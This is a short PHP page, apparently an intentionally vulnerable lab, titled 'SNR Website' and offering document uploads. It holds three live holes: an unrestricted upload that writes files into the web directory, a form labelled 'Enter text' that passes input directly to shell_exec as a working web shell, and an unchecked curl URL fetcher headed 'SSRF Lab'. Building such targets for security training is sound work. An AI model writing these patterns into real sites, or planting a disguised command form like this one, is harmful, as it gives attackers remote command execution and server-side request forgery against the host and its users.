<!DOCTYPE html>
<html>

<head>
    <title>SNR Website</title>
  </head>
  <h1>SNR Website - please upload your document</h1>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload task document" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Your document upload successfully!<b><br><br>'; }
else { echo '<b>file not uploaded!</b><br><br>'; }
}

$url = $_GET['url'];

// Function to fetch content from the specified URL
function fetchContent($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);
    return $content;
}

// Process the user-provided URL
if (isset($url)) {
    // Check if the URL starts with 'http://' or 'https://'
    if (strpos($url, 'http://') !== 0 && strpos($url, 'https://') !== 0) {
        $url = 'http://' . $url; // Assume http:// if no scheme is provided
    }

    $content = fetchContent($url);

    // Display the fetched content
    echo "<pre>" . htmlentities($content) . "</pre>";
}


?>
  
  <body>
    <h1>SNR Website</h1>
    <form method="POST">
      <label>Enter text:</label><br>
      <input type="text" name="cmd"><br>
      <input type="submit" value="submit">
    </form>
    <?php
      if (isset($_POST["cmd"])) {
        $cmd = $_POST["cmd"];
        $output = shell_exec($cmd);
        echo "<pre>$output</pre>";
      }
    ?>

<h1>SSRF Lab</h1>
    <form action="" method="GET">
        <label for="url">Enter URL:</label>
        <input type="text" name="url" id="url">
        <input type="submit" value="Fetch URL">
    </form>
  </body>
</html>

